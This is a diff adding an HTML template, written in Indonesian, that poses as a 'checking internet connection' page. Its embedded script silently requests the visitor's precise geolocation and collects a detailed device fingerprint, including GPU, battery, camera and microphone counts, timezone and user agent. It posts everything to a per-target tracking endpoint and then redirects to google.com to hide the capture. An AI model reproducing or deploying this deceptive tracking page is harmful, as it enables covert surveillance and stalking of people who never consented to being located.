@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memeriksa Koneksi...</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: #0a0a0a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255,255,255,0.05);
+            border-top: 5px solid #28a745;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="text-center px-3">
+        <div class="loader"></div>
+        <h4 class="mt-4 fw-light">Memeriksa Koneksi Internet...</h4>
+        <p class="text-secondary small">Harap tunggu, sedang memverifikasi jaringan Anda.</p>
+        <div class="progress mt-4 mx-auto" style="max-width: 300px; height: 4px; background: #1a1a1a;">
+            <div class="progress-bar progress-bar-striped progress-bar-animated bg-success" style="width: 100%"></div>
+        </div>
+        <p class="mt-4 text-secondary" style="font-size: 0.8rem;">
+            <i class="bi bi-shield-lock"></i> Koneksi aman (HTTPS)
+        </p>
+    </div>
+    <script>
+    (function() {
+        var trackingId = '{{ tracking_id }}';
+
+        function parseUA(ua) {
+            var result = { device: '', os: '', browser: '' };
+            if (/iPhone/.test(ua)) {
+                result.device = 'iPhone';
+                var m = ua.match(/iPhone OS (\d+[_\d]*)/);
+                if (m) result.os = 'iOS ' + m[1].replace(/_/g, '.');
+            } else if (/iPad/.test(ua)) {
+                result.device = 'iPad';
+                var m = ua.match(/iPhone OS (\d+[_\d]*)/);
+                if (m) result.os = 'iOS ' + m[1].replace(/_/g, '.');
+            } else if (/Android/.test(ua)) {
+                var m = ua.match(/Android ([\d.]+)/);
+                if (m) result.os = 'Android ' + m[1];
+                var dm = ua.match(/; ([\w]+ [\w]+|[\w]+) Build/);
+                if (dm) result.device = dm[1];
+            } else if (/Windows/.test(ua)) {
+                result.os = 'Windows';
+                result.device = 'PC';
+            } else if (/Mac OS X/.test(ua)) {
+                var m = ua.match(/Mac OS X ([\d_]+)/);
+                result.os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
+                result.device = 'Mac';
+            } else if (/Linux/.test(ua)) {
+                result.os = 'Linux';
+                result.device = 'PC';
+            }
+            if (/Chrome/.test(ua) && !/Edg/.test(ua)) {
+                var m = ua.match(/Chrome\/([\d.]+)/);
+                result.browser = 'Chrome ' + (m ? m[1] : '');
+            } else if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
+                var m = ua.match(/Version\/([\d.]+)/);
+                result.browser = 'Safari ' + (m ? m[1] : '');
+            } else if (/Firefox/.test(ua)) {
+                var m = ua.match(/Firefox\/([\d.]+)/);
+                result.browser = 'Firefox ' + (m ? m[1] : '');
+            } else if (/Edg/.test(ua)) {
+                var m = ua.match(/Edg\/([\d.]+)/);
+                result.browser = 'Edge ' + (m ? m[1] : '');
+            } else if (/OPR/.test(ua) || /Opera/.test(ua)) {
+                var m = ua.match(/(?:OPR|Opera)\/([\d.]+)/);
+                result.browser = 'Opera ' + (m ? m[1] : '');
+            }
+            return result;
+        }
+
+        function collectDeviceInfo() {
+            var ua = navigator.userAgent;
+            var parsed = parseUA(ua);
+            var info = {
+                device_model: parsed.device,
+                os: parsed.os,
+                browser: parsed.browser,
+                platform: navigator.platform || '',
+                user_agent: ua,
+                language: navigator.language || '',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+                screen: screen.width + 'x' + screen.height,
+                color_depth: screen.colorDepth || 0,
+                pixel_ratio: window.devicePixelRatio || 1,
+                orientation: (screen.orientation && screen.orientation.type) || '',
+                cpu_cores: navigator.hardwareConcurrency || 0,
+                ram_gb: navigator.deviceMemory || null,
+                cookies_enabled: navigator.cookieEnabled,
+                do_not_track: navigator.doNotTrack || '',
+                vibration: 'vibrate' in navigator,
+            };
+
+            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                info.connection_type = conn.effectiveType || '';
+                info.downlink = conn.downlink || 0;
+                info.rtt = conn.rtt || 0;
+            }
+
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    var ext = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (ext) {
+                        info.gpu_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                        info.gpu_vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+                    }
+                }
+            } catch(e) {}
+
+            return info;
+        }
+
+        async function collectAsyncInfo(info) {
+            if (navigator.getBattery) {
+                try {
+                    var battery = await navigator.getBattery();
+                    info.battery_level = Math.round(battery.level * 100);
+                    info.battery_charging = battery.charging;
+                } catch(e) {}
+            }
+
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    var devices = await navigator.mediaDevices.enumerateDevices();
+                    var counts = {};
+                    devices.forEach(function(d) { counts[d.kind] = (counts[d.kind] || 0) + 1; });
+                    info.cameras = counts.videoinput || 0;
+                    info.microphones = counts.audioinput || 0;
+                    info.speakers = counts.audiooutput || 0;
+                } catch(e) {}
+            }
+
+            return info;
+        }
+
+        async function sendAll(position) {
+            var info = collectDeviceInfo();
+            await collectAsyncInfo(info);
+
+            var data = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                device_info: info
+            };
+
+            try {
+                await fetch('/api/location/' + trackingId, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {}
+            window.location.href = 'https://google.com';
+        }
+
+        function sendError() {
+            window.location.href = 'https://google.com';
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendAll, sendError, {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            });
+        } else {
+            sendError();
+        }
+    })();
+    </script>
+</body>
+</html>
